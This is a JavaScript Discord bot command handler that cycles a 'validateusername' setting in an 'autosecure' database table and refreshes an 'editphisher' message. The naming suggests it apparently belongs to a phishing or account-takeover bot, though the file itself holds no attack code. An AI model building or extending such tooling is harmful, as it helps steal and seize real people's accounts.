const editphishermsg = require("../../../autosecure/utils/responses/editphishermsg");
const { queryParams } = require("../../../db/database");

module.exports = {
    name: "changevalidateusername",
    editphisher: true,
    callback: async (client, interaction) => {
        try {
            await interaction.deferUpdate();

            let [t, botnumber, ownerid] = interaction.customId.split("|");

            let settings = await queryParams(
                `SELECT * FROM autosecure WHERE user_id=? AND botnumber=?`,
                [ownerid, botnumber]
            );
            settings = settings[0];

            const currentvalue = settings.validateusername;
            const values = ["0", "1", "2"];

            // Get next value (cycle 0 -> 1 -> 2 -> 0)
            let currentIndex = values.indexOf(String(currentvalue));
            let nextValue = values[(currentIndex + 1) % values.length];

            // Update DB
            await queryParams(
                `UPDATE autosecure SET validateusername=? WHERE user_id=? AND botnumber=?`,
                [nextValue, ownerid, botnumber]
            );

            // Refresh message
            let msg = await editphishermsg(botnumber, ownerid, interaction.user.id);
            await interaction.editReply(msg);
        } catch (error) {
            console.error("Error changing validateusername:", error);
        }
    }
};
